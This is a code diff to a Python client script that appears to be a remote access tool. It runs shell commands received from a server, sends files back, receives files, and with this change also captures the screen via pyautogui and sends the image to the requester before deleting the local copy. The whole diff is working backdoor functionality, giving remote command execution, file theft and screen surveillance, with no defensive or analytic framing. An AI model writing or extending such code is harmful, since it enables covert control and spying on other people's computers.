@@ -4,6 +4,8 @@ import threading
 import argparse
 import subprocess
 import os
+import time
+import pyautogui
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--name", help="Initial buffer to send")
@@ -42,7 +44,7 @@ def execute_command(command):
     return output
 
 def transfer_file(priorityname, file_path):
-    #print("SENDING_FILE: ")
+
     if not os.path.isfile(file_path):
         print(f"File {file_path} does not exist.")
         return
@@ -122,10 +124,13 @@ def client_listener():
         try:
             buffer = s.recv(1024)
             data = buffer.decode("UTF-8", errors="ignore")
+            
+            # print("DATA: ", data)
+
             if not buffer:
                 break
             if b"CMD_OUTPUT" in buffer:
-                #print("CMD OUTPUT DETECTED")
+
                 data = receive_cmd_output(s, data)
 
                 print(data, end="")
@@ -150,23 +155,24 @@ def client_listener():
                 filename = parts[1]
                 file_size = int(parts[2])
 
-                #print("FILE_TRANSFER DETECTED:",filename,"SIZE:",file_size)
 
-                receive_file(
+                # print("EXPECTED:", file_size)
+                # print("FIRST:", len(first_file_data))
+
+                received = receive_file(
                     s,
                     first_file_data,
                     filename,
                     file_size
                 )
 
+                # print("TOTAL RECEIVED:", received)
+
                 continue
 
-            #print("OPTION: " + data.split(" ")[1])
             if data.split(" ")[1] == "-run":                
                 priorityname = data.split(" ")[0]
                 command = data.split(priorityname + " -run ")[1]
-
-                #print(f"Executing command from {priorityname}: {command}")
 
                 output = execute_command(command)
 
@@ -181,9 +187,26 @@ def client_listener():
 
                 s.send(message.encode("UTF-8"))
                 continue
+            
+            elif data.startswith("-screenshot "):
+                priority_name = data.split()[1]
+
+                screenshot_path = os.path.join(
+                    os.getcwd(),
+                    f"screenshot_{int(time.time())}.png"
+                )
+
+                try:
+                    pyautogui.screenshot().save(screenshot_path)
+                    file_size = os.path.getsize(screenshot_path)
+                    transfer_file(priority_name, screenshot_path)
+                finally:
+                    try:
+                        os.remove(screenshot_path)
+                    except OSError:
+                        pass
 
             elif data.split(" ")[1] == "-get":
-                #print("DATASUKA: ", data)
                 priorityname = data.split(" ")[0]
                 filenameWithname = data.split(priorityname + " -get ")[1].strip()
                 filename= filenameWithname.split(" ")[1]
